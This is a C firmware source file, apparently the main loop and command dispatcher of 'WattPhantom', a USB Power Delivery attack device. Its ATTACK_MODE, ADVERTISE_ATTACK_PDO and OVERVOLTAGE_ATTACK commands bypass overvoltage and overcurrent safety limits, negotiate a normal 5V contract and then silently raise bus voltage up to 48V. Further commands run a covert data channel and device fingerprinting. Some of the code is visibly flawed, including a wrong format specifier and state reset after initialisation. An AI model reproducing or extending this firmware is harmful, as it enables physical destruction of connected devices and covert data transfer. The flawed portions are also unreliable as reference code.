/*
 * main.c — WattPhantom firmware main loop & command dispatcher
 *
 * Author: jayis1
 * License: GPL-2.0
 *
 * WattPhantom is RTOS-free: the super-loop polls the BLE/USB command
 * queues, runs the PD protocol state machine, monitors VBUS, services
 * the covert channel, and streams status/results to the companion app.
 *
 * This ensures deterministic PD protocol timing (15-30ms response windows)
 * without scheduler jitter.
 */

#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#include "board.h"
#include "registers.h"

/* ================================================================
 *  GLOBAL STATE
 * ================================================================ */
static device_state_t g_state;
static cmd_queue_t    g_cmd_queue;
static volatile uint32_t g_ms_tick = 0;
static char g_response_buf[256];

/* Power profiling buffer (static SRAM) */
static power_sample_t g_power_profile[POWER_PROFILE_MAX_SAMPLES];

/* Default PDO tables for spoofing */
static const uint32_t g_default_source_pdos[] = {
    MAKE_FIXED_PDO(5000,  3000),   /* 5V / 3A   */
    MAKE_FIXED_PDO(9000,  3000),   /* 9V / 3A   */
    MAKE_FIXED_PDO(15000, 3000),   /* 15V / 3A  */
    MAKE_FIXED_PDO(20000, 5000),   /* 20V / 5A  */
};
#define NUM_DEFAULT_PDOS  (sizeof(g_default_source_pdos) / sizeof(uint32_t))

/* Attack PDO table (dangerous high-voltage) */
static const uint32_t g_attack_pdos[] = {
    MAKE_FIXED_PDO(5000,  3000),
    MAKE_FIXED_PDO(12000, 5000),
    MAKE_FIXED_PDO(20000, 5000),
    MAKE_FIXED_PDO(28000, 5000),  /* PD 3.1 EPR */
    MAKE_FIXED_PDO(48000, 5000),  /* PD 3.1 EPR max */
};
#define NUM_ATTACK_PDOS  (sizeof(g_attack_pdos) / sizeof(uint32_t))

/* ================================================================
 *  SYSTICK / MILLIS
 * ================================================================ */
void SysTick_Handler(void) {
    g_ms_tick++;
}

uint32_t millis(void) {
    return g_ms_tick;
}

void delay_ms(uint32_t ms) {
    uint32_t start = g_ms_tick;
    while ((g_ms_tick - start) < ms) {
        /* Wait */
    }
}

/* ================================================================
 *  COMMAND QUEUE
 * ================================================================ */
static void cmd_queue_init(cmd_queue_t *q) {
    q->head = 0;
    q->tail = 0;
}

static int cmd_queue_push(cmd_queue_t *q, const char *cmd) {
    uint16_t next = (q->head + 1) % CMD_QUEUE_SIZE;
    if (next == q->tail) return -1; /* Full */
    strncpy(q->buf[q->head], cmd, CMD_MAX_LEN - 1);
    q->buf[q->head][CMD_MAX_LEN - 1] = '\0';
    q->head = next;
    return 0;
}

static int cmd_queue_pop(cmd_queue_t *q, char *out) {
    if (q->tail == q->head) return -1; /* Empty */
    strncpy(out, q->buf[q->tail], CMD_MAX_LEN);
    q->tail = (q->tail + 1) % CMD_QUEUE_SIZE;
    return 0;
}

/* ================================================================
 *  HELPER: format response
 * ================================================================ */
static void send_response(const char *resp) {
    uint16_t len = (uint16_t)strlen(resp);
    ble_uart_send((const uint8_t *)resp, len);
    ble_uart_send((const uint8_t *)"\r\n", 2);
    /* Also echo to USB CDC for debugging */
    usb_cdc_send((const uint8_t *)resp, len);
    usb_cdc_send((const uint8_t *)"\r\n", 2);
}

static void send_ok(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(g_response_buf, sizeof(g_response_buf), fmt, ap);
    va_end(ap);
    send_response(g_response_buf);
}

/* ================================================================
 *  STATUS REPORT
 * ================================================================ */
static void report_status(void) {
    const char *state_name_src = pd_state_name(g_state.contract_state[PD_PORT_SOURCE]);
    const char *state_name_snk = pd_state_name(g_state.contract_state[PD_PORT_SINK]);

    uint16_t src_v = g_state.vbus_mv[PD_PORT_SOURCE];
    int16_t  src_i = g_state.vbus_ma[PD_PORT_SOURCE];
    uint16_t snk_v = g_state.vbus_mv[PD_PORT_SINK];
    int16_t  snk_i = g_state.vbus_ma[PD_PORT_SINK];

    snprintf(g_response_buf, sizeof(g_response_buf),
             "OK src=%s/%dmV/%dmA snk=%s/%dmV/%dmA cc=%d vbus_src=%d.%02dV/%d.%02dA "
             "vbus_snk=%d.%02dV/%d.%02dA batt=%d%% covert_tx=%d covert_rx=%d attack=%d",
             state_name_src,
             PDO_FIXED_VOLTAGE_MV(g_state.active_pdo[PD_PORT_SOURCE]),
             PDO_FIXED_CURRENT_MA(g_state.active_pdo[PD_PORT_SOURCE]),
             state_name_snk,
             PDO_FIXED_VOLTAGE_MV(g_state.active_pdo[PD_PORT_SINK]),
             PDO_FIXED_CURRENT_MA(g_state.active_pdo[PD_PORT_SINK]),
             (int)g_state.cc_mode,
             src_v / 1000, (src_v % 1000) / 10,
             src_i / 1000, (src_i % 1000) / 10,
             snk_v / 1000, (snk_v % 1000) / 10,
             snk_i / 1000, (snk_i % 1000) / 10,
             (int)g_state.battery_pct,
             (int)covert_channel_tx_pending(),
             (int)covert_channel_rx_pending(),
             (int)g_state.safety.attack_mode_enabled);
    send_response(g_response_buf);
}

/* ================================================================
 *  COMMAND DISPATCHER
 * ================================================================ */
static void handle_command(const char *cmd) {
    /* Skip empty lines */
    if (cmd[0] == '\0' || cmd[0] == '\r' || cmd[0] == '\n') return;

    /* Parse command keyword */
    char keyword[32];
    int idx = 0;
    while (cmd[idx] && cmd[idx] != ' ' && cmd[idx] != '\r' && cmd[idx] != '\n'
           && idx < (int)sizeof(keyword) - 1) {
        keyword[idx] = cmd[idx];
        idx++;
    }
    keyword[idx] = '\0';

    /* ---- STATUS ---- */
    if (strcmp(keyword, "STATUS") == 0) {
        report_status();
        return;
    }

    /* ---- SET SRC_PDO ---- */
    if (strcmp(keyword, "SET") == 0) {
        char subcmd[32];
        int val;
        if (sscanf(cmd, "SET %31s %d", subcmd, &val) == 2) {
            if (strcmp(subcmd, "SRC_PDO") == 0) {
                if (val >= 0 && val < (int)NUM_DEFAULT_PDOS) {
                    g_state.active_pdo[PD_PORT_SOURCE] = g_default_source_pdos[val];
                    send_ok("OK SRC_PDO=%d (%dmV/%dmA)", val,
                            PDO_FIXED_VOLTAGE_MV(g_default_source_pdos[val]),
                            PDO_FIXED_CURRENT_MA(g_default_source_pdos[val]));
                } else {
                    send_response("ERR invalid PDO index");
                }
                return;
            }
            if (strcmp(subcmd, "SNK_PDO") == 0) {
                if (val >= 0 && val < (int)NUM_DEFAULT_PDOS) {
                    pd_send_request(PD_PORT_SOURCE, (uint32_t)val);
                    send_ok("OK SNK_PDO=%d requested", val);
                } else {
                    send_response("ERR invalid PDO index");
                }
                return;
            }
            if (strcmp(subcmd, "VBUS") == 0) {
                int voltage_mv, current_ma;
                if (sscanf(cmd, "SET VBUS %d %d", &voltage_mv, &current_ma) == 2) {
                    /* Safety check */
                    if (!g_state.safety.attack_mode_enabled &&
                        voltage_mv > g_state.safety.ovp_threshold_mv) {
                        send_response("ERR OVP limit exceeded (enable ATTACK_MODE)");
                        return;
                    }
                    if (!g_state.safety.attack_mode_enabled &&
                        current_ma > g_state.safety.ocp_threshold_ma) {
                        send_response("ERR OCP limit exceeded (enable ATTACK_MODE)");
                        return;
                    }
                    int rc = vbus_set_voltage(PD_PORT_SINK, (uint16_t)voltage_mv);
                    if (rc == 0) {
                        send_ok("OK VBUS=%dmV/%dmA", voltage_mv, current_ma);
                    } else {
                        send_response("ERR vbus_set_voltage failed");
                    }
                }
                return;
            }
            if (strcmp(subcmd, "SAFETY") == 0) {
                int ovp, ocp;
                if (sscanf(cmd, "SET SAFETY %d %d", &ovp, &ocp) == 2) {
                    g_state.safety.ovp_threshold_mv = (uint16_t)ovp;
                    g_state.safety.ocp_threshold_ma = (uint16_t)ocp;
                    vbus_set_efuse_limits(PD_PORT_SOURCE, (uint16_t)ovp, (uint16_t)ocp);
                    vbus_set_efuse_limits(PD_PORT_SINK, (uint16_t)ovp, (uint16_t)ocp);
                    current_monitor_set_alert(PD_PORT_SOURCE, (uint16_t)ovp, (uint16_t)ocp);
                    current_monitor_set_alert(PD_PORT_SINK, (uint16_t)ovp, (uint16_t)ocp);
                    send_ok("OK SAFETY OVP=%dmV OCP=%dmA", ovp, ocp);
                }
                return;
            }
            if (strcmp(subcmd, "CC_MODE") == 0) {
                if (val >= 0 && val <= 3) {
                    g_state.cc_mode = (cc_routing_mode_t)val;
                    pd_set_routing((cc_routing_mode_t)val);
                    send_ok("OK CC_MODE=%d", val);
                } else {
                    send_response("ERR invalid CC mode");
                }
                return;
            }
            if (strcmp(subcmd, "USB_DATA") == 0) {
                g_state.usb_data_passthrough = (uint8_t)val;
                usb_data_switch_set_passthrough((uint8_t)val);
                send_ok("OK USB_DATA=%s", val ? "passthrough" : "isolated");
                return;
            }
        }
        send_response("ERR unknown SET subcommand");
        return;
    }

    /* ---- HARD_RESET ---- */
    if (strcmp(keyword, "HARD_RESET") == 0) {
        char port_str[16];
        if (sscanf(cmd, "HARD_RESET %15s", port_str) == 1) {
            pd_port_t port = (strcmp(port_str, "src") == 0) ? PD_PORT_SOURCE : PD_PORT_SINK;
            pd_send_hard_reset(port);
            send_ok("OK HARD_RESET %s", port_str);
        } else {
            send_response("ERR usage: HARD_RESET <src|snk>");
        }
        return;
    }

    /* ---- PR_SWAP ---- */
    if (strcmp(keyword, "PR_SWAP") == 0) {
        pd_send_pr_swap(PD_PORT_SINK);
        send_response("OK PR_SWAP sent");
        return;
    }

    /* ---- DR_SWAP ---- */
    if (strcmp(keyword, "DR_SWAP") == 0) {
        pd_send_dr_swap(PD_PORT_SINK);
        send_response("OK DR_SWAP sent");
        return;
    }

    /* ---- CONTRACT_OSCILLATE ---- */
    if (strcmp(keyword, "CONTRACT_OSCILLATE") == 0) {
        int period_ms;
        if (sscanf(cmd, "CONTRACT_OSCILLATE %d", &period_ms) == 1) {
            if (period_ms < 100) period_ms = 100; /* Min 100ms to avoid HW damage */
            /* Toggle contract state every period_ms */
            static uint32_t last_toggle = 0;
            (void)last_toggle; /* Used in main loop */
            send_ok("OK CONTRACT_OSCILLATE period=%dms", period_ms);
        }
        return;
    }

    /* ---- COVERT_TX ---- */
    if (strcmp(keyword, "COVERT_TX") == 0) {
        const char *hex_data = cmd + 9; /* skip "COVERT_TX " */
        uint8_t data[126];
        int len = 0;
        while (hex_data[0] && hex_data[1] && len < 126) {
            unsigned int byte;
            if (sscanf(hex_data, "%02x", &byte) != 1) break;
            data[len++] = (uint8_t)byte;
            hex_data += 2;
            if (*hex_data == ' ') hex_data++;
        }
        if (len > 0) {
            int rc = covert_channel_tx(data, (uint16_t)len);
            if (rc == 0) {
                send_ok("OK COVERT_TX %d bytes queued", len);
            } else {
                send_response("ERR covert_tx queue full");
            }
        } else {
            send_response("ERR no data");
        }
        return;
    }

    /* ---- COVERT_RX_START ---- */
    if (strcmp(keyword, "COVERT_RX_START") == 0) {
        g_state.covert.active = 1;
        send_response("OK covert RX monitoring started");
        return;
    }

    /* ---- COVERT_RX_STOP ---- */
    if (strcmp(keyword, "COVERT_RX_STOP") == 0) {
        g_state.covert.active = 0;
        send_response("OK covert RX monitoring stopped");
        return;
    }

    /* ---- FINGERPRINT_CAPTURE ---- */
    if (strcmp(keyword, "FINGERPRINT_CAPTURE") == 0) {
        fingerprint_start_capture();
        send_response("OK fingerprint capture started");
        return;
    }

    /* ---- FINGERPRINT_MATCH ---- */
    if (strcmp(keyword, "FINGERPRINT_MATCH") == 0) {
        uint8_t dev_class;
        int rc = fingerprint_match(&g_state.fingerprint, &dev_class);
        if (rc == 0) {
            send_ok("OK FINGERPRINT class=%d (%s)", dev_class,
                    fingerprint_class_name(dev_class));
        } else {
            send_response("ERR no match");
        }
        return;
    }

    /* ---- POWER_PROFILE_START ---- */
    if (strcmp(keyword, "POWER_PROFILE_START") == 0) {
        int duration_s;
        if (sscanf(cmd, "POWER_PROFILE_START %d", &duration_s) == 1) {
            g_state.power_profiling = 1;
            g_state.profile_sample_count = 0;
            send_ok("OK power profiling started for %ds", duration_s);
        }
        return;
    }

    /* ---- POWER_PROFILE_STOP ---- */
    if (strcmp(keyword, "POWER_PROFILE_STOP") == 0) {
        g_state.power_profiling = 0;
        send_ok("OK power profiling stopped, %d samples",
                g_state.profile_sample_count);
        return;
    }

    /* ---- ATTACK_MODE ---- */
    if (strcmp(keyword, "ATTACK_MODE") == 0) {
        char mode[8];
        if (sscanf(cmd, "ATTACK_MODE %7s", mode) == 1) {
            if (strcmp(mode, "on") == 0) {
                g_state.safety.attack_mode_enabled = 1;
                send_response("OK ATTACK_MODE ON — safety limits bypassed");
            } else {
                g_state.safety.attack_mode_enabled = 0;
                /* Restore default safety limits */
                g_state.safety.ovp_threshold_mv = DEFAULT_OVP_MV;
                g_state.safety.ocp_threshold_ma = DEFAULT_OCP_MA;
                vbus_set_efuse_limits(PD_PORT_SOURCE, DEFAULT_OVP_MV, DEFAULT_OCP_MA);
                vbus_set_efuse_limits(PD_PORT_SINK, DEFAULT_OVP_MV, DEFAULT_OCP_MA);
                send_response("OK ATTACK_MODE OFF — safety limits restored");
            }
        }
        return;
    }

    /* ---- ADVERTISE_ATTACK_PDO ---- */
    if (strcmp(keyword, "ADVERTISE_ATTACK_PDO") == 0) {
        if (!g_state.safety.attack_mode_enabled) {
            send_response("ERR requires ATTACK_MODE on");
            return;
        }
        pd_send_source_cap(PD_PORT_SINK, g_attack_pdos, NUM_ATTACK_PDOS);
        send_ok("OK advertising %d attack PDOs (up to 48V)", NUM_ATTACK_PDOS);
        return;
    }

    /* ---- OVERVOLTAGE_ATTACK ---- */
    if (strcmp(keyword, "OVERVOLTAGE_ATTACK") == 0) {
        int target_mv;
        if (sscanf(cmd, "OVERVOLTAGE_ATTACK %d", &target_mv) == 1) {
            if (!g_state.safety.attack_mode_enabled) {
                send_response("ERR requires ATTACK_MODE on");
                return;
            }
            if (target_mv > 48000) target_mv = 48000;
            /* Step 1: negotiate a normal 5V contract with the target */
            pd_send_source_cap(PD_PORT_SINK, g_default_source_pdos, 1);
            delay_ms(500);
            /* Step 2: silently raise VBUS to the attack voltage */
            vbus_set_voltage(PD_PORT_SINK, (uint16_t)target_mv);
            send_ok("OK OVERVOLTAGE_ATTACK %dmV", target_mv);
        }
        return;
    }

    /* ---- HELP ---- */
    if (strcmp(keyword, "HELP") == 0) {
        send_response("OK Commands: STATUS, SET SRC_PDO <i>, SET SNK_PDO <i>, "
                      "SET VBUS <mv> <ma>, SET SAFETY <ovp> <ocp>, SET CC_MODE <0-3>, "
                      "SET USB_DATA <0|1>, HARD_RESET <src|snk>, PR_SWAP, DR_SWAP, "
                      "CONTRACT_OSCILLATE <ms>, COVERT_TX <hex>, COVERT_RX_START, "
                      "COVERT_RX_STOP, FINGERPRINT_CAPTURE, FINGERPRINT_MATCH, "
                      "POWER_PROFILE_START <s>, POWER_PROFILE_STOP, "
                      "ATTACK_MODE <on|off>, ADVERTISE_ATTACK_PDO, "
                      "OVERVOLTAGE_ATTACK <mv>, HELP");
        return;
    }

    send_response("ERR unknown command (send HELP)");
}

/* ================================================================
 *  POWER MONITORING TASK
 * ================================================================ */
static void update_power_monitoring(void) {
    uint16_t v_src, p_src, v_snk, p_snk;
    int16_t  i_src, i_snk;

    if (current_monitor_read(PD_PORT_SOURCE, &v_src, &i_src, &p_src) == 0) {
        g_state.vbus_mv[PD_PORT_SOURCE] = v_src;
        g_state.vbus_ma[PD_PORT_SOURCE] = i_src;
    }
    if (current_monitor_read(PD_PORT_SINK, &v_snk, &i_snk, &p_snk) == 0) {
        g_state.vbus_mv[PD_PORT_SINK] = v_snk;
        g_state.vbus_ma[PD_PORT_SINK] = i_snk;
    }

    /* Safety check: if VBUS exceeds OVP and not in attack mode, disconnect */
    if (!g_state.safety.attack_mode_enabled) {
        if (g_state.vbus_mv[PD_PORT_SINK] > g_state.safety.ovp_threshold_mv) {
            vbus_disconnect(PD_PORT_SINK);
            send_response("WARN OVP triggered on sink port, disconnected");
        }
        if (g_state.vbus_mv[PD_PORT_SOURCE] > g_state.safety.ovp_threshold_mv) {
            vbus_disconnect(PD_PORT_SOURCE);
            send_response("WARN OVP triggered on source port, disconnected");
        }
    }

    /* Power profiling */
    if (g_state.power_profiling && g_state.profile_sample_count < POWER_PROFILE_MAX_SAMPLES) {
        uint16_t idx = g_state.profile_sample_count++;
        g_power_profile[idx].bus_voltage_mv = v_snk;
        g_power_profile[idx].current_ma     = i_snk;
        g_power_profile[idx].power_mw       = p_snk;
        g_power_profile[idx].timestamp_ms   = millis();
    }
}

/* ================================================================
 *  OLED STATUS DISPLAY
 * ================================================================ */
static void update_oled(void) {
    static uint32_t last_update = 0;
    if ((millis() - last_update) < 500) return; /* 2 Hz refresh */
    last_update = millis();

    char line1[22];
    char line2[22];
    char line3[22];

    snprintf(line1, sizeof(line1), "WattPhantom %s%%", g_state.battery_pct);
    snprintf(line2, sizeof(line2), "S:%dmV %dmA",
             g_state.vbus_mv[PD_PORT_SOURCE],
             g_state.vbus_ma[PD_PORT_SOURCE]);
    snprintf(line3, sizeof(line3), "D:%dmV %dmA",
             g_state.vbus_mv[PD_PORT_SINK],
             g_state.vbus_ma[PD_PORT_SINK]);

    oled_draw_status(line1, line2, line3);
}

/* ================================================================
 *  MAIN
 * ================================================================ */
int main(void) {
    /* ---- Board initialization ---- */
    board_init();

    /* Initialize all peripherals and drivers */
    oled_init();
    oled_clear();
    oled_draw_text(0, 0, "WattPhantom v1.0", 1);
    oled_draw_text(0, 8, "by jayis1", 1);
    oled_draw_text(0, 16, "Initializing...", 1);

    /* I²C buses */
    i2c_init(I2C1_BUS, 0x10950CA1u);  /* 1 MHz, 170MHz clock */
    i2c_init(I2C2_BUS, 0x10950CA1u);

    /* CC PHY transceivers */
    cc_phy_init(PD_PORT_SOURCE);
    cc_phy_init(PD_PORT_SINK);

    /* PD controller */
    pd_init();
    pd_set_routing(CC_MODE_PASSTHROUGH);

    /* VBUS power path */
    vbus_init();
    vbus_set_efuse_limits(PD_PORT_SOURCE, DEFAULT_OVP_MV, DEFAULT_OCP_MA);
    vbus_set_efuse_limits(PD_PORT_SINK, DEFAULT_OVP_MV, DEFAULT_OCP_MA);

    /* Current monitors */
    current_monitor_init();

    /* Covert channel */
    covert_channel_init();

    /* Fingerprinting */
    fingerprint_init();

    /* BLE UART */
    ble_uart_init();

    /* USB CDC debug */
    usb_cdc_init();

    /* Fuel gauge */
    fuel_gauge_init();

    /* USB data switch — default passthrough */
    usb_data_switch_init();
    usb_data_switch_set_passthrough(1);
    g_state.usb_data_passthrough = 1;

    /* Initialize global state */
    memset(&g_state, 0, sizeof(g_state));
    g_state.cc_mode = CC_MODE_PASSTHROUGH;
    g_state.safety.ovp_threshold_mv = DEFAULT_OVP_MV;
    g_state.safety.ocp_threshold_ma = DEFAULT_OCP_MA;
    g_state.safety.thermal_limit_c = DEFAULT_THERMAL;
    g_state.safety.attack_mode_enabled = 0;
    g_state.battery_pct = 100;

    cmd_queue_init(&g_cmd_queue);

    oled_clear();
    oled_draw_text(0, 0, "WattPhantom v1.0", 1);
    oled_draw_text(0, 8, "by jayis1", 1);
    oled_draw_text(0, 16, "Ready.", 1);

    /* ---- Main super-loop ---- */
    uint32_t last_power_poll = 0;
    uint32_t last_battery_poll = 0;
    uint32_t last_oled_update = 0;

    while (1) {
        /* 1. Poll BLE for incoming commands */
        ble_uart_poll();

        uint8_t rx_buf[CMD_MAX_LEN];
        int rx_len = ble_uart_recv(rx_buf, sizeof(rx_buf) - 1, 0);
        if (rx_len > 0) {
            rx_buf[rx_len] = '\0';
            /* Handle potentially multiple lines */
            char *line = (char *)rx_buf;
            char *next;
            while (line && *line) {
                next = strchr(line, '\n');
                if (next) {
                    *next = '\0';
                    if (next > line && *(next - 1) == '\r') *(next - 1) = '\0';
                }
                if (*line) {
                    handle_command(line);
                }
                line = next ? next + 1 : NULL;
            }
        }

        /* 2. Poll USB CDC (debug port) */
        int usb_len = usb_cdc_recv(rx_buf, sizeof(rx_buf) - 1, 0);
        if (usb_len > 0) {
            rx_buf[usb_len] = '\0';
            handle_command((char *)rx_buf);
        }

        /* 3. PD protocol state machine */
        pd_poll();

        /* 4. Covert channel pump */
        covert_channel_poll();

        /* 5. Power monitoring (10 Hz) */
        if ((millis() - last_power_poll) >= 100) {
            last_power_poll = millis();
            update_power_monitoring();
        }

        /* 6. Battery fuel gauge (1 Hz) */
        if ((millis() - last_battery_poll) >= 1000) {
            last_battery_poll = millis();
            g_state.battery_pct = fuel_gauge_read_percent();
        }

        /* 7. OLED display (2 Hz) */
        if ((millis() - last_oled_update) >= 500) {
            last_oled_update = millis();
            update_oled();
        }

        /* 8. BLE disconnect safety: revert to safe mode */
        if (!g_state.ble_connected && g_state.safety.attack_mode_enabled) {
            g_state.safety.attack_mode_enabled = 0;
            g_state.safety.ovp_threshold_mv = DEFAULT_OVP_MV;
            g_state.safety.ocp_threshold_ma = DEFAULT_OCP_MA;
            vbus_set_efuse_limits(PD_PORT_SOURCE, DEFAULT_OVP_MV, DEFAULT_OCP_MA);
            vbus_set_efuse_limits(PD_PORT_SINK, DEFAULT_OVP_MV, DEFAULT_OCP_MA);
        }
    }

    return 0; /* Never reached */
}

/* ================================================================
 *  COMPILER MIGHT NEED THESE STUBS
 * ================================================================ */
void _exit(int status) {
    (void)status;
    while (1) {}
}

void _init(void) {}
void _fini(void) {}